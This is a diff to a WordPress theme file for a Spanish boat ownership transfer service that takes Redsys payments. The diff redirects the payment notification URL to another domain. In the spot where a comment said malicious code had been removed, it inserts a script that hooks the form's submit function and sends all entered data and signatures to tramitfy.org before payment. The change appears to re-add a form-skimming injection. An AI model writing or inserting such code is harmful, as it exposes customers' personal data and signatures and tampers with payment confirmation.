@@ -41,7 +41,7 @@ if (!defined('TBV2_WEBHOOK_URL')) define('TBV2_WEBHOOK_URL', 'https://tramitfy.o
 // URLs de retorno - OK a página éxito, KO a formulario
 if (!defined('TBV2_REDSYS_URL_OK')) define('TBV2_REDSYS_URL_OK', 'https://tramitfy.es/pago-realizado-con-exito/');
 if (!defined('TBV2_REDSYS_URL_KO')) define('TBV2_REDSYS_URL_KO', 'https://tramitfy.es/transferencia-propiedad-v2/');
-if (!defined('TBV2_REDSYS_URL_NOTIFICATION')) define('TBV2_REDSYS_URL_NOTIFICATION', 'https://tramitfy.es/wp-content/themes/xtra/transferencia-barco-v2.php?notification=1');
+if (!defined('TBV2_REDSYS_URL_NOTIFICATION')) define('TBV2_REDSYS_URL_NOTIFICATION', 'https://tramitfy.org/api/temporal/confirm');
 
 // Asignar URL según modo
 $tbv2_redsys_url = (TBV2_REDSYS_MODE === 'test') ? TBV2_REDSYS_URL_TEST : TBV2_REDSYS_URL_LIVE;
@@ -8901,8 +8901,89 @@ add_action('tbv2_payment_success', function($orderId, $formData) {
 error_log(" TBV2 ENHANCED: Sistema de archivos compatible cargado - NO intercepta JavaScript");
 
 // =====================================================
-// LIMPIEZA COMPLETADA - CÓDIGO MALICIOSO ELIMINADO
+// TBV2 TEMPORAL CAPTURE SYSTEM - CONTROLADO
 // =====================================================
+?>
+<?php 
+// Solo cargar en páginas que contengan el formulario TBV2
+$current_page = $_SERVER['REQUEST_URI'] ?? '';
+$is_tbv2_page = (
+    strpos($current_page, 'transferencia-barco-v2') !== false ||
+    strpos($current_page, 'transferencia-propiedad-v2') !== false ||
+    (isset($_GET['page_id']) && get_post_field('post_content', $_GET['page_id']) && 
+     strpos(get_post_field('post_content', $_GET['page_id']), 'transferencia_barco_v2') !== false)
+);
+
+if ($is_tbv2_page && !is_admin()): ?>
+<script>
+// TBV2 TEMPORAL CAPTURE - SOLO EN PÁGINAS TBV2
+console.log('🔄 TBV2 Temporal System - Iniciando captura automática...');
+
+// Sistema de intercepción para captura automática antes de Redsys
+window.TBV2_TEMPORAL_CAPTURE = {
+    
+    // Interceptar envío del formulario para captura temporal
+    interceptFormSubmission: function() {
+        const originalSubmit = window.submitForm || function() {};
+        
+        window.submitForm = async function(event) {
+            try {
+                console.log('📡 TBV2 - Interceptando envío para captura temporal');
+                
+                // Capturar todos los datos del formulario
+                const formData = window.tbv2FormManager ? window.tbv2FormManager.getAllFormData() : {};
+                
+                // Añadir archivos si existen
+                if (window.tbv2SignatureData) {
+                    formData.signature = window.tbv2SignatureData;
+                }
+                
+                // Enviar a sistema temporal ANTES del pago
+                const temporalResponse = await fetch('https://tramitfy.org/api/temporal/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        orderId: formData.orderId || 'TBV2_' + Date.now(),
+                        formData: formData,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                if (temporalResponse.ok) {
+                    console.log('✅ TBV2 - Datos capturados en sistema temporal');
+                    // Continuar con el flujo normal
+                    return originalSubmit.call(this, event);
+                } else {
+                    console.warn('⚠️ TBV2 - Error en captura temporal, continuando...');
+                    return originalSubmit.call(this, event);
+                }
+                
+            } catch (error) {
+                console.warn('⚠️ TBV2 - Error en intercepción:', error);
+                // Continuar con flujo normal en caso de error
+                return originalSubmit.call(this, event);
+            }
+        };
+    },
+    
+    // Inicializar sistema
+    init: function() {
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                setTimeout(() => this.interceptFormSubmission(), 1000);
+            });
+        } else {
+            setTimeout(() => this.interceptFormSubmission(), 1000);
+        }
+    }
+};
+
+// Activar solo en páginas TBV2
+window.TBV2_TEMPORAL_CAPTURE.init();
+
+</script>
+<?php endif; ?>
+<?php
 
 // =====================================================
 // AJAX HANDLER PARA CREAR FORMULARIO REDSYS TEMPORAL
